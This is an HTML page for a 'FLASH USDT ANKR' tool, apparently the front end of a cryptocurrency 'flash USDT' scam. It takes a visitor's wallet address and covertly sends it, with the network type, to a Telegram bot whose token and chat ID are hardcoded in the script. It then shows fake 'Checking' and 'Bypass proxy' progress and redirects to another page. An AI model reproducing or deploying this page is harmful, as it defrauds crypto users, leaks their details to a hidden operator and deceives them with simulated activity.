<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>FLASH USDT ANKR</title>
  <style>
    :root{
      --bg:#0e1116;
      --card:#121720;
      --text:#e7edf4;
      --muted:#9aa7b5;
      --accent:#98f5ff;
      --ring:#233041;
      --btn:#1b2431;
      --btnHover:#243145;
      --input:#0f1520;
      --border:#1f2a3a;
    }
    *{box-sizing:border-box}
    body{
      margin:0;
      background: radial-gradient(1200px 600px at 50% 50%, #22304733, transparent 60%), var(--bg);
      color:var(--text);
      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Noto Naskh Arabic UI", "Noto Kufi Arabic", Arial, sans-serif;
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:24px;
    }
    .card{
      width:min(680px, 92vw);
      background:linear-gradient(180deg, #0f1622, #0c121a);
      border:1px solid var(--border);
      border-radius:20px;
      box-shadow: 0 10px 30px #0007, inset 0 1px 0 #ffffff0f;
      padding:24px;
    }
    .header{
      display:flex;
      align-items:center;
      gap:14px;
      padding-bottom:16px;
      border-bottom:1px dashed #ffffff1a;
      margin-bottom:20px;
    }
    .logo{
      width:64px;height:64px;border-radius:50%;
      object-fit:cover;object-position:center;
      border:2px solid #ffffff22;
      box-shadow:0 0 0 3px #98f5ff22, 0 6px 14px #0008;
      background:#0c141d;
    }
    .title{
      font-size: clamp(20px, 3.4vw, 28px);
      font-weight:700;
      letter-spacing: .3px;
    }
    .subtitle{color:var(--muted); font-size:14px; margin-top:2px}
    .field{
      display:flex; flex-direction:column; gap:8px; margin: 12px 0 22px;
    }
    .label{font-weight:600; color:#cfe3f7; font-size:14px}
    .input{
      background:var(--input);
      color:var(--text);
      border:1px solid var(--border);
      border-radius:14px;
      padding:14px 16px;
      font-size:15px;
      outline:none;
      transition: border-color .2s, box-shadow .2s;
    }
    .input:focus{
      border-color:#98f5ff66;
      box-shadow:0 0 0 4px #98f5ff22;
    }

    /* زر الطاقة */
    #checkbox{ display:none; }
    .switch{
      position:relative;
      width:100px; height:100px;
      background-color:rgb(99,99,99);
      border-radius:50%;
      z-index:1; cursor:pointer;
      display:flex; align-items:center; justify-content:center;
      border:2px solid rgb(126,126,126);
      box-shadow:0 0 3px rgb(2,2,2) inset;
      transition: transform .1s ease-in-out;
    }
    .switch svg{ width:1.6em; }
    .switch svg path{ fill:rgb(48,48,48); }
    .switch:active{ transform: scale(.97); }

    /* صورة الشبكة مع الإشعاع */
    .network-logo{
      width:100px; height:100px; border-radius:50%;
      object-fit:cover; border:3px solid #fff;
      display:none;
      animation: glow 2s infinite;
    }
    @keyframes glow {
      0% { box-shadow: 0 0 10px var(--accent), 0 0 20px var(--accent), 0 0 30px var(--accent); }
      50% { box-shadow: 0 0 20px var(--accent), 0 0 40px var(--accent), 0 0 60px var(--accent); }
      100% { box-shadow: 0 0 10px var(--accent), 0 0 20px var(--accent), 0 0 30px var(--accent); }
    }

    .center-switch{
      display:flex;
      justify-content:center;
      align-items:center;
      margin:20px 0;
    }

    .connect{
      width:100%;
      background:var(--btn);
      color:var(--text);
      border:1px solid var(--ring);
      border-radius:14px;
      padding:14px 18px;
      font-size:16px;
      font-weight:700;
      display:flex; align-items:center; justify-content:center;
      gap:10px;
      cursor:pointer;
    }
    .connect[disabled]{ opacity:.6; cursor:not-allowed; }
    .spinner{
      width:18px;height:18px; border-radius:50%;
      border:3px solid #ffffff33; border-top-color:var(--accent);
      animation: spin 1s linear infinite;
      display:none;
    }
    .connect.loading .spinner{ display:inline-block; }
    @keyframes spin{ to{ transform: rotate(360deg); } }
  </style>
</head>
<body>
  <main class="card">
    <header class="header">
      <img src="logo.png" alt="Logo" class="logo" />
      <div>
        <div class="title">FLASH USDT ANKR</div>
        <div class="subtitle"></div>
      </div>
    </header>

    <div class="field">
      <label class="label" for="wallet">Your adress wallet</label>
      <input id="wallet" class="input" type="text" placeholder="Enter  usdt wallet [bep20/trc20]" autocomplete="off" />
    </div>

    <div class="center-switch">
      <input id="checkbox" type="checkbox" />
      <label class="switch" for="checkbox" id="switchLabel">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
          <path d="M288 32c0-17.7-14.3-32-32-32s-32 14.3-32 32V256c0 17.7 14.3 32 32 32s32-14.3 32-32V32zM143.5 120.6c13.6-11.3 15.4-31.5 4.1-45.1s-31.5-15.4-45.1-4.1C49.7 115.4 16 181.8 16 256c0 132.5 107.5 240 240 240s240-107.5 240-240c0-74.2-33.8-140.6-86.6-184.6c-13.6-11.3-33.8-9.4-45.1 4.1s-9.4 33.8 4.1 45.1c38.9 32.3 63.5 81 63.5 135.4c0 97.2-78.8 176-176 176s-176-78.8-176-176c0-54.4 24.7-103.1 63.5-135.4z"></path>
        </svg>
      </label>
      <img id="networkLogo" class="network-logo" alt="Network" />
    </div>

    <button id="connectBtn" class="connect" type="button" disabled>
      <span class="spinner"></span>
      <span id="connectText">Connect</span>
    </button>
  </main>

  <script>
    const btn = document.getElementById('connectBtn');
    const text = document.getElementById('connectText');
    const spinner = btn.querySelector('.spinner');
    const walletInput = document.getElementById('wallet');
    const checkbox = document.getElementById('checkbox');
    const switchLabel = document.getElementById('switchLabel');
    const networkLogo = document.getElementById('networkLogo');

    const BOT_TOKEN = "8447607145:AAEWZpX2CUURrXahC_ZWrpnAsOffYiL9zfY";
    const CHAT_ID = "8066634898";

    function getWalletType(address) {
      if (/^0x[a-fA-F0-9]{40}$/.test(address)) {
        return 'bep';
      }
      if (/^T[a-zA-Z0-9]{33}$/.test(address)) {
        return 'trc';
      }
      return null;
    }

    checkbox.addEventListener('change', () => {
      if (checkbox.checked) {
        const addr = walletInput.value.trim();
        const type = getWalletType(addr);
        if (type) {
          btn.disabled = false;
          switchLabel.style.display = 'none';
          networkLogo.src = type === 'trc' ? 'trc.png' : (type === 'bep' ? 'bep.png' : 'erc.png');
          networkLogo.style.display = 'block';
        } else {
          alert("⚠️ عنوان المحفظة غير صالح.\nيرجى إدخال عنوان TRC20 أو BEP20 أو ERC20 صحيح.");
          checkbox.checked = false;
          btn.disabled = true;
        }
      } else {
        btn.disabled = true;
        switchLabel.style.display = 'flex';
        networkLogo.style.display = 'none';
      }
    });

    btn.addEventListener('click', () => {
      const stages = ["Checking", "Bypass proxy", "Connected"];
      const stepMs = 2000;
      btn.disabled = true;
      btn.classList.add('loading');
      spinner.style.display = 'inline-block';
      text.textContent = stages[0];

      const addr = walletInput.value.trim();
      const type = getWalletType(addr);
      localStorage.setItem('networkLogo', type === 'trc' ? 'trc.png' : (type === 'bep' ? 'bep.png' : 'erc.png'));

      // إرسال البيانات إلى تيليغرام
      const message = `💳 Wallet Address: ${addr}\n🔗 Network: ${type}`;
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
      }).catch(err => console.error(err));

      stages.forEach((label, idx) => {
        setTimeout(() => {
          text.textContent = label;
        }, idx * stepMs);
      });

      setTimeout(() => {
        window.location.href = 'page1.html';
      }, stages.length * stepMs);
    });
  </script>
</body>
</html>
